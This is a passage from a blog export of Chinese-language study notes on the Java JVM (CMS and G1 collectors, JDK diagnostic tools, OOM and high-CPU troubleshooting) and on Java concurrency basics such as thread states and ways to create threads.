<strong>CMS（Concurrent Mark Sweep）收集器是 HotSpot 虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。</strong></p>
<p><strong>采用标记-清除算法实现</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>初始标记：</strong> 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；</p>
</li>
<li class="lvl-2">
<p><strong>并发标记</strong>：并发标记阶段就是从 GC Roots的直接关联对象开始遍历整个对象图的过程 ，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行；</p>
</li>
<li class="lvl-2">
<p><strong>重新标记：</strong> 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录</p>
</li>
<li class="lvl-2">
<p><strong>并发清除：</strong> 比并发标记阶段的时间短；最后是并发清除阶段，清理删除掉标记阶段判断的已经死亡的对象，由于不需要移动存活对象，所以这个阶段也是可以与用户线程同时并发的。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092147011.png" alt="image.png"></p>
<h3 id="6-6-1-优缺点">6.6.1 优缺点</h3>
<p>优点：并发收集、低停顿</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>对 CPU 资源敏感；</strong>  在并发阶段，它虽然不会导致用户线程停顿，但是会因为占用了一部分线程（或者说CPU 资源）而导致应用程序变慢，总吞吐量会降低。</p>
</li>
<li class="lvl-2">
<p><strong>无法处理浮动垃圾：</strong> 由于CMS <mark>并发清理</mark>阶段用户线程还在运行着，伴随程序的运行自然还会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后， CMS 无法在本次收集中处理掉它们，只好留待下一次GC 时再将其清理掉。这一部分垃圾就称为“浮动垃圾＂。</p>
</li>
<li class="lvl-2">
<p>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量<strong>空间碎片</strong>产生。 空间碎片过多时，将会给大对象分配带来很大的麻烦，往往会出现老年代还有很大的空间剩余，但是无法找到足够大的连续空间来分配当前对象，不得不提前触发一次Full GC 。</p>
</li>
</ul>
<h2 id="6-7-Garbage-First-G1">6.7 Garbage First(G1)</h2>
<p><strong>G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征.</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>并行与并发</strong>：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。</p>
</li>
<li class="lvl-2">
<p><strong>分代收集</strong>：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。</p>
</li>
<li class="lvl-2">
<p><strong>空间整合</strong>：与 CMS 的“标记-清除”算法不同，<strong>G1 从整体来看是基于“标记-整理”算法实现的收集器</strong>；从局部上来看是基于“标记-复制”算法实现的。</p>
</li>
<li class="lvl-2">
<p><strong>可预测的停顿</strong>：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092200481.png" alt="image.png"></p>
<p>初始标记：仅仅只是标记一下 GC Roots能直接关联到的对象，并且修改 TAMS 指针的 值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。并发标记：从 GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较最终标记：筛选回收：负责更新 Region的统计数据，对各个 Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个 Region 构成回收集，然后把决定回收的那一部分</p>
<p>G1 收集器在后台维护了一个<mark>优先列表</mark>，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来)。这种使用 <mark>Region划分内存空间</mark>以及有<mark>优先级的区域回收方式</mark>，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p>
<p>G1垃圾回收器具有以下特点：</p>
<ol>
<li class="lvl-3">
<p><strong>区域化内存管理</strong>：G1将堆内存划分为多个固定大小的区域（Region），每个区域可以是Eden区、Survivor区或Old区。这种区域化的内存管理有助于更好地控制垃圾回收过程，减少停顿时间。</p>
</li>
<li class="lvl-3">
<p><strong>分代收集</strong>：虽然G1并不是一个传统的分代收集器，但它仍然将堆内存划分为年轻代和老年代，并且使用不同的垃圾回收策略来处理这两个代。</p>
</li>
<li class="lvl-3">
<p><strong>并发标记清除</strong>：G1使用了并发标记（Concurrent Marking）来减少垃圾回收暂停时间。在标记阶段，G1通过并发标记线程来标记活动对象，而在应用程序运行的同时，也会继续标记操作。这样可以减少标记阶段对应用程序的影响。</p>
</li>
<li class="lvl-3">
<p><strong>整理内存</strong>：G1使用了复制算法来清理内存，不再使用传统的压缩算法。在垃圾收集过程中，G1会选择一些区域进行垃圾收集，并将存活对象复制到其他区域中，从而实现内存的整理和碎片整理。</p>
</li>
<li class="lvl-3">
<p><strong>垃圾优先收集</strong>：G1根据垃圾回收需求来选择优先回收的区域，以此来提高垃圾回收效率。它会优先选择包含垃圾最多的区域进行回收，从而最大程度地减少垃圾对象。</p>
</li>
</ol>
<h1>7 参考</h1>
<p><a href="https://blog.csdn.net/xl_1803/article/details/110823487">标记复制法、标记清除法和标记整理法的区别-CSDN博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM (3)：JDK监控和故障处理工具</title>
    <url>/2024/04/10/%E6%A1%86%E6%9E%B6/JVM/JVM%20(3)%EF%BC%9AJDK%E7%9B%91%E6%8E%A7%E5%92%8C%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>jps</code></strong> (JVM Process Status）: 类似 UNIX 的 <code>ps</code> 命令。用于查看所有 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息；</p>
</li>
<li class="lvl-2">
<p><mark>jstat</mark>（JVM Statistics Monitoring Tool）: 用于收集 HotSpot 虚拟机各方面的运行数据;<mark>gc情况、垃圾回收统计</mark></p>
</li>
<li class="lvl-2">
<p><strong><code>jinfo</code></strong> (Configuration Info for Java) : Configuration Info for Java,显示虚拟机配置信息;</p>
</li>
<li class="lvl-2">
<p><mark>jmap</mark> (Memory Map for Java) : 生成堆转储快照;<mark>内存布局、堆信息</mark></p>
</li>
<li class="lvl-2">
<p><strong><code>jhat</code></strong> (JVM Heap Dump Browser) : 用于分析 heapdump 文件，它会建立一个 HTTP/HTML 服务器，让用户可以在浏览器上查看分析结果;</p>
</li>
<li class="lvl-2">
<p><mark>jstack</mark> (Stack Trace for Java) : 生成虚拟机当前时刻的线程快照，线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合。</p>
</li>
</ul>
<h1>1 JVM参数</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404102245741.png" alt="image.png"><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404112053964.png" alt="image.png"></p>
<h2 id="1-1-堆参数">1.1 堆参数</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">初始堆(memory start)大小、最大堆大小</span><br><span class="line">-Xms&lt;heap size&gt;[unit]</span><br><span class="line">-Xmx&lt;heap size&gt;[unit]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">年轻代大小</span><br><span class="line">-XX:NewSize=n </span><br><span class="line">-XX:NewRatio=n  年轻代和年老代比值为1:n</span><br><span class="line">-XX:SurvivorRatio=n 年轻代中Eden区与两个Survivor区的比值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">格式：-XX:[+-]&lt;name&gt; 表示启用或者禁用name属性。</span><br><span class="line">例子：-XX:+UseG1GC（表示启用G1垃圾收集器）</span><br></pre></td></tr></table></figure>
<h1>2 jstack :生成虚拟机当前时刻的线程快照</h1>
<p><code>jstack</code>（Stack Trace for Java）命令用于生成虚拟机当前时刻的线程快照。线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合.</p>
<p>生成线程快照的目的主要是定位线程长时间出现停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等都是导致线程长时间停顿的原因。线程出现停顿的时候通过<code>jstack</code>来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者在等待些什么资源。</p>
<h1>3 OOM类型</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>虚拟机栈：</p>
</li>
<li class="lvl-2">
<p>固定大小：申请不到栈帧报 StackOverflow</p>
</li>
<li class="lvl-2">
<p>无限大小：申请不到栈帧报 OutOfMemory</p>
</li>
<li class="lvl-2">
<p>堆：忘记是不是能固定大小了</p>
</li>
<li class="lvl-2">
<p>jvm内存满了，对象分配不到堆了就会报OutOfMemory</p>
</li>
<li class="lvl-2">
<p>方法区：(面试官提示，感谢)</p>
</li>
<li class="lvl-2">
<p>方法区里面的常量池也是会不断加入数据的</p>
</li>
<li class="lvl-2">
<p>一直调用string.intern()方法会不断加字符串到字符串常量池导致OOM</p>
</li>
</ul>
<h1>4 OOM排查</h1>
<blockquote>
<p>OOM 全称 “Out Of Memory”，表示内存耗尽。当 JVM 因为没有足够的内存来为对象分配空间，并且垃圾回收器也已经没有空间可回收时，就会抛出这个错误。产生原因：</p>
<ol>
<li class="lvl-3">分配过少：JVM 初始化内存小，业务使用了大量内存；或者不同 JVM 区域分配内存不合理</li>
<li class="lvl-3">代码漏洞：某一个对象被频繁申请，不用了之后却没有被释放，导致内存耗尽</li>
</ol>
</blockquote>
<p><strong>内存泄漏</strong>：<mark>申请使用完的内存没有释放</mark>，导致虚拟机不能再次使用该内存，此时这段内存就泄露了。因为申请者不用了，而又不能被虚拟机分配给别人用</p>
<p><strong>内存溢出</strong>：申请的内存超出了 JVM 能提供的内存大小，此时称之为溢出</p>
<h2 id="4-1-OOM类型">4.1 OOM类型</h2>
<p><strong>java.lang.OutOfMemoryError: PermGen space</strong></p>
<p>Java7 永久代（方法区）溢出，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。每当一个类初次加载的时候，元数据都会存放到永久代</p>
<p>一般出现于大量 Class 对象或者 JSP 页面，或者采用 CgLib 动态代理技术导致</p>
<p>我们可以通过 <code>-XX：PermSize</code> 和 <code>-XX：MaxPermSize</code> 修改方法区大小</p>
<blockquote>
<p>Java8 将永久代变更为元空间，报错：java.lang.OutOfMemoryError: Metadata space，元空间内存不足默认进行动态扩展</p>
</blockquote>
<p><strong>java.lang.StackOverflowError</strong></p>
<p><strong>虚拟机栈溢出</strong>，一般是由于程序中存在 <strong>死循环或者深度递归调用</strong> 造成的。如果栈大小设置过小也会出现溢出，可以通过 <code>-Xss</code> 设置栈的大小</p>
<p>虚拟机抛出栈溢出错误，可以在日志中定位到错误的类、方法</p>
<p><strong>java.lang.OutOfMemoryError: Java heap space</strong></p>
<p><strong>Java 堆内存溢出</strong>，溢出的原因一般由于 JVM 堆内存设置不合理或者内存泄漏导致</p>
<p>如果是内存泄漏，可以通过工具查看泄漏对象到 GC Roots 的引用链。掌握了泄漏对象的类型信息以及 GC Roots 引用链信息，就可以精准地定位出泄漏代码的位置</p>
<p>如果不存在内存泄漏，就是内存中的对象确实都还必须存活着，那就应该检查虚拟机的堆参数（-Xmx 与 -Xms），查看是否可以将虚拟机的内存调大些</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tasklist | findstr &quot;java&quot;</span><br><span class="line"></span><br><span class="line">查看内存堆栈信息  </span><br><span class="line">//查看jvm内存分布</span><br><span class="line">jmap -heap pid</span><br><span class="line">jhsdb jmap --heap --pid 16279  </span><br><span class="line">(对于jdk8之后的版本，不能再使用jmap -heap pid的命令了，需要使用上面的命令)。</span><br><span class="line"></span><br><span class="line">- 查看gc情况  </span><br><span class="line">    jstat -gc pid 刷新时间  </span><br><span class="line">    例如：jstat -gc 1289 5000 表示每5秒查看一次pid为1289的gc时间。</span><br><span class="line">- 查看内存对象实例数量  </span><br><span class="line">    jmap -histo:live 16279 &gt; c.jmap  </span><br><span class="line">    将结果导入到c.jmap的文件中，这个是自定义的文件。</span><br></pre></td></tr></table></figure>
<h2 id="4-2-案例1（Xmn-Xmx，老年代内存为0）">4.2 案例1（Xmn=Xmx，老年代内存为0）</h2>
<p><code>Heap Space Size = Young Space Size + Old Space Size</code>，而<code>-Xmn</code>参数控制的正是 Young 区的大小，当堆区被 Young Gen 完全挤占，又有对象想要升代到 Old Gen 时，发现 Old 区空间不足，于是触发 Full GC，触发 Full GC 以后呢，通常又会面临两种情况：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Young 区又刚好腾出来一点空间，对象又不用放到 Old 区里面了，皆大欢喜</p>
</li>
<li class="lvl-2">
<p>Young 区空间还是不够，对象还是得放到 Old 区，Old 区空间不够，卒，喜提<code>OOM</code></p>
</li>
<li class="lvl-2">
<p>诶，就是奔着 Old 区去的，管你 Young 不 Young，Old 区空间不够，卒，喜提<code>OOM</code></p>
</li>
</ul>
<p>这个就解释了为什么系统刚刚启动时，会有一个短时间正常工作的现象，随后，当某段程序触发 Old Gen 升代时，就会发生随机的<code>OOM</code>错误。那么什么时候对象会进入老年代呢？这里也很有意思，不妨结合日志里面出现<code>OOM</code>的地方，对号入座：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>经历足够多次数 GC 依然存活的对象</p>
</li>
<li class="lvl-2">
<p>申请一个大对象（比如超过 Eden 区一半大小）</p>
</li>
<li class="lvl-2">
<p>GC 后 Eden 区对象大小超过 S 区之和</p>
</li>
<li class="lvl-2">
<p>Eden 区 + S0 区 GC 后，S1 区放不下</p>
</li>
</ul>
<p>换言之，正常情况下，<code>-Xmn</code>参数总是应当小于<code>-Xmx</code>参数，否则就会触发<code>OOM</code>错误。</p>
<h1>5 CPU占用过高，排查和处理</h1>
<p>在Linux环境下，项目出现CPU占用过高的情况时，可以按照以下步骤进行排查和处理：</p>
<ol>
<li class="lvl-3">
<p><strong>定位高CPU占用的进程</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">使用<code>top</code>命令查看系统中CPU占用率最高的进程。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>分析进程中的线程</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">如果发现某个进程的CPU占用率特别高，可以使用<code>top -H -p [PID]</code>来查看该进程中各个线程的CPU占用情况。</li>
<li class="lvl-6">找出占用CPU最高的线程ID。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>转换线程ID为16进制</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">使用<code>printf &quot;%x\n&quot; [线程ID]</code>命令将线程ID转换为16进制格式。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>获取线程堆栈信息</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">使用<code>jstack [进程PID] | grep [线程ID的16进制] -A 30</code>命令获取该线程的Java堆栈信息（如果是Java进程）。这可以帮助定位到具体的代码行或方法调用。</li>
<li class="lvl-6">如果不是Java进程，可以使用<code>gdb</code>或其他相应的调试工具来获取线程的堆栈信息。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>分析代码和日志</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">根据堆栈信息，检查相关的代码逻辑，看是否有死循环、资源泄露、复杂计算等导致CPU占用过高的问题。</li>
<li class="lvl-6">同步问题导致的死锁、过度的上下文切换，或者资源竞争等问题。这可能会涉及到分析操作系统级别的线程调度，JVM内部锁的状态，以及可能的I/O等待、网络延迟等问题。</li>
<li class="lvl-6">同时检查应用程序的日志，看是否有异常或错误信息与高CPU占用相关。</li>
</ul>
</li>
<li class="lvl-5">
<p>性能剖析</p>
<ul class="lvl-2">
<li class="lvl-8">使用性能剖析工具（如VisualVM, YourKit, JProfiler等）进行实时监控，找出CPU占用率高的方法。</li>
</ul>
</li>
</ol>
<pre><code>- 这些工具可以提供热点（hot spots）功能，显示哪些方法占用最多的CPU时间。
</code></pre>
<ol>
<li class="lvl-3">
<p><strong>处理措施</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">如果是代码问题，修复相应的bug或优化算法。</li>
<li class="lvl-6">如果是配置问题，调整系统或应用程序的配置参数。</li>
<li class="lvl-6">如果是资源不足，考虑增加硬件资源或优化资源分配。</li>
<li class="lvl-6">如果是外部攻击，加强系统的安全防护措施。<a href="https://blog.csdn.net/baiye_xing/article/details/90483169">线上Java 高CPU占用、高内存占用排查思路_java程序,在线metaspace使用高-CSDN博客</a><a href="https://zhuanlan.zhihu.com/p/312276166">助你了解jvm命令，查找JVM堆栈信息，分析性能问题 - 知乎 (zhihu.com)</a></li>
</ul>
</li>
</ol>
<p><a href="https://blog.csdn.net/qq_43012298/article/details/136560538#:~:text=%E6%8E%92%E6%9F%A5CPU%E9%A3%99%E9%AB%98%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9A%201%20%E7%9B%91%E6%8E%A7CPU%E4%BD%BF%E7%94%A8%E7%8E%87%3A%20%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B7%A5%E5%85%B7%EF%BC%88%E5%A6%82%20top%20%E5%91%BD%E4%BB%A4%E5%9C%A8Linux%E4%B8%8A%EF%BC%8C%20Task%20Manager,6%20%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%3A%20%E6%A0%B9%E6%8D%AE%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%BE%8B%E5%A6%82%E9%87%8D%E6%9E%84%E7%AE%97%E6%B3%95%EF%BC%8C%E5%87%8F%E5%B0%91%E9%94%81%E7%AB%9E%E4%BA%89%E7%AD%89%E3%80%82%20...%207%20%E9%AA%8C%E8%AF%81%E4%BF%AE%E5%A4%8D%3A%20%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%90%8E%EF%BC%8C%E9%87%8D%E6%96%B0%E8%BF%9B%E8%A1%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E3%80%82%20">CPU飙高的排查方案及思路_cpu冲高排查思路-CSDN博客</a></p>
<h1>6 参考</h1>
<p>JVM参数<a href="https://javaguide.cn/java/jvm/jvm-parameters-intro.html">最重要的JVM参数总结 | JavaGuide</a><br>
<a href="https://blog.csdn.net/o9109003234/article/details/119951151">美团面试：熟悉哪些JVM调优参数，幸好我准备过！-CSDN博客</a></p>
<p><a href="https://javaguide.cn/java/jvm/jdk-monitoring-and-troubleshooting-tools.html">JDK监控和故障处理工具总结 | JavaGuide</a><br>
<a href="https://www.cnblogs.com/mylibs/p/production-accident-0002.html">生产事故-记一次特殊的OOM排查 - 程语有云 - 博客园 (cnblogs.com)</a><br>
<a href="https://heapdump.cn/article/1661497">YGC问题排查，又让我涨姿势了！ | HeapDump性能社区</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>OOM</tag>
        <tag>CPU占用高</tag>
      </tags>
  </entry>
  <entry>
    <title>Java：并发</title>
    <url>/2024/02/28/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java%E5%B9%B6%E5%8F%91(1)%EF%BC%9A%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h1>1 进程和线程</h1>
<p>进程具有两个特点：</p>
<ul class="lvl-0">
<li class="lvl-2">资源所有权：进程具有对资源的控制权和所有权，这些资源包括内存、I/O通道、I/O设备和文件等。</li>
<li class="lvl-2">调度/执行：进程时可被操作系统调度和分派的实体</li>
</ul>
<p>进程是程序的一次执行过程，是系统运行程序的基本单位，因此进程是动态的。系统运行一个程序即是一个进程从创建，运行到消亡的过程。</p>
<p>将分派的单位称为线程或轻量级进程，线程是程序执行的最小单位，同类的多个线程共享进程的<strong>堆</strong>和<strong>方法区</strong>资源，但每个线程有自己的<strong>程序计数器</strong>、<strong>虚拟机栈</strong>和<strong>本地方法栈</strong>。</p>
<h2 id="1-1-用户线程、内核线程">1.1 用户线程、内核线程</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户线程：由用户空间程序管理和调度的线程，运行在用户空间（专门给应用程序使用）。</p>
</li>
<li class="lvl-2">
<p>内核线程：由操作系统内核管理和调度的线程，运行在内核空间（只有内核程序可以访问）。</p>
</li>
<li class="lvl-2">
<p>用户线程：创建和切换成本低，不可以利用多核。内核一次把一个进程分配给一个处理器，一个进程中只有一个线程可以执行</p>
</li>
<li class="lvl-2">
<p>内核线程：创建和切换成本高，需要从用户模式切换到内核模式，再切换回用户模式。可以利用多核。</p>
</li>
</ul>
<p>用户线程创建和切换成本低，但不可以利用多核。内核态线程，创建和切换成本高，可以利用多核。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403032054516.png" alt="image.png"></p>
<h2 id="1-2-虚拟线程">1.2 虚拟线程</h2>
<p><strong>虚拟线程（Virtual Thread）是 JDK 而不是 OS 实现的轻量级线程(Lightweight Process，LWP），由 JVM 调度。</strong> 许多虚拟线程共享同一个操作系统线程，虚拟线程的数量可以远大于操作系统线程的数量。</p>
<p>在引入虚拟线程之前，<code>java.lang.Thread</code> 包已经支持所谓的平台线程，也就是没有虚拟线程之前，我们一直使用的线程。JVM 调度程序通过<code>平台线程</code>（载体线程）来管理<code>虚拟线程</code>，一个平台线程可以在不同的时间执行不同的虚拟线程（多个虚拟线程挂载在一个平台线程上），当虚拟线程被阻塞或等待时，平台线程可以切换到执行另一个虚拟线程。<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405151057182.png" alt="image.png"><br>
关于平台线程和系统内核线程的对应关系多提一点：在 Windows 和 Linux 等主流操作系统中，Java 线程采用的是一对一的线程模型，也就是一个平台线程对应一个系统内核线程。</p>
<p>相比较于平台线程来说，虚拟线程是廉价且轻量级的，使用完后立即被销毁，因此它们不需要被重用或池化，每个任务可以有自己专属的虚拟线程来运行。虚拟线程暂停和恢复来实现线程之间的切换，避免了上下文切换的额外耗费，兼顾了多线程的优点，简化了高并发程序的复杂，可以有效减少编写、维护和观察高吞吐量并发应用程序的工作量。</p>
<h1>2 线程</h1>
<h2 id="2-1-线程状态和生命周期">2.1 线程状态和生命周期</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403032125806.png" alt="image.png|350"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>NEW</code>: 新建状态，线程被创建出来但没有被调用 <code>start()</code> 。</p>
</li>
<li class="lvl-2">
<p><code>RUNNABLE</code>: 可运行状态，线程被调用了 <code>start()</code>等待运行的状态。</p>
</li>
<li class="lvl-2">
<p><code>BLOCKED</code>：阻塞状态，需要等待锁释放。</p>
</li>
<li class="lvl-2">
<p><code>WAITING</code>：等待状态，表示该线程需要等待其他线程做出一些特定动作（通知或中断）。</p>
</li>
<li class="lvl-2">
<p><code>TIME_WAITING</code>：超时等待状态，可以在指定的时间后自行返回而不是像 WAITING 那样一直等待。</p>
</li>
<li class="lvl-2">
<p><code>TERMINATED</code>：终止状态，表示该线程已经运行完毕。</p>
</li>
</ul>
<p>生命周期：程序的执行过程再不同状态之间切换<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406112041394.png" alt="image.png"></p>
<h3 id="2-1-1-被阻塞线程和等待线程">2.1.1 被阻塞线程和等待线程</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>当一个线程试图获取一个<code>内部的对象锁</code>（而不是java.util.concurrent 库中的锁)，而该锁被其他线程持有， 则该线程进人阻塞状态。当所有其他线程释放该锁，并且线程调度器允许本线程持有它的时候，该线程将变成非阻塞状态。</p>
</li>
<li class="lvl-2">
<p>当线程等待另一个线程通知调度器一个条件时， 它自己进入等待状态。在调用Object.wait 方法或<code>Thread.join</code>方法， 或者是等待java.util.concurrent 库中的Lock 或Condition 时， 就会出现这种情况。实际上，被阻塞状态与等待状态是有很大不同的。</p>
</li>
<li class="lvl-2">
<p>有几个方法有一个超时参数。调用它们导致线程进人计时等待（ timed waiting ) 状态。这一状态将一直保持到超时期满或者接收到适当的通知。带有超时参数的方法有Thread.sleep 和Object.wait、Thread.join、Lock,tryLock 以及Condition.await 的计时版。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">join</span><span class="params">()</span>; <span class="comment">//等待终止指定的线程</span></span><br></pre></td></tr></table></figure>
<h2 id="2-2-线程上下文切换">2.2 线程上下文切换</h2>
<blockquote>
<p>线程切换意味着需要保存当前线程的上下文，留待线程下次占用 CPU 的时候恢复现场。并加载下一个将要占用 CPU 的线程上下文。这就是所谓的 <strong>上下文切换</strong>。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>主动让出 CPU，比如调用了 <code>sleep()</code>, <code>wait()</code> 等。</p>
</li>
<li class="lvl-2">
<p>时间片用完，因为操作系统要防止一个线程或者进程长时间占用 CPU 导致其他线程或者进程饿死。</p>
</li>
<li class="lvl-2">
<p>调用了阻塞类型的系统中断，比如请求 IO，线程被阻塞。</p>
</li>
<li class="lvl-2">
<p>被终止或结束运行</p>
</li>
</ul>
<h2 id="2-3-创建线程">2.3 创建线程</h2>
<blockquote>
<p>继承<code>Thread</code>类、实现<code>Runnable</code>接口、实现<code>Callable</code>接口、使用线程池、使用<code>CompletableFuture</code>类等</p>
</blockquote>
<h3 id="2-3-1-继承Thread类">2.3.1 继承Thread类</h3>
<p>用户自定义类继承java.lang.Thread类，重写其run()方法，run()方法中定义了线程执行的具体任务。创建该类的实例后，通过调用start()方法启动线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 线程执行的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">MyThread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();</span><br><span class="line">    t.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-2-实现Runnable接口">2.3.2 实现Runnable接口</h3>
<p>如果一个类已经继承了其他类，就不能再继承Thread类，此时可以实现java.lang.Runnable接口。实现Runnable接口需要重写run()方法，然后将此Runnable对象作为参数传递给Thread类的构造器，创建Thread对象后调用其start()方法启动线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 线程执行的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>());</span><br><span class="line">    t.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-3-3-实现Callable接口与FutureTask">2.3.3 实现Callable接口与FutureTask</h3>
<p>java.util.concurrent.Callable接口类似于Runnable，但Callable的call()方法可以有返回值并且可以抛出异常。要执行Callable任务，需将它包装进一个FutureTask，因为Thread类的构造器只接受Runnable参数，而FutureTask实现了Runnable接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCallable</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 线程执行的代码，这里返回一个整型结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">MyCallable</span> <span class="variable">task</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyCallable</span>();</span><br><span class="line">    FutureTask&lt;Integer&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(task);</span><br><span class="line">    <span 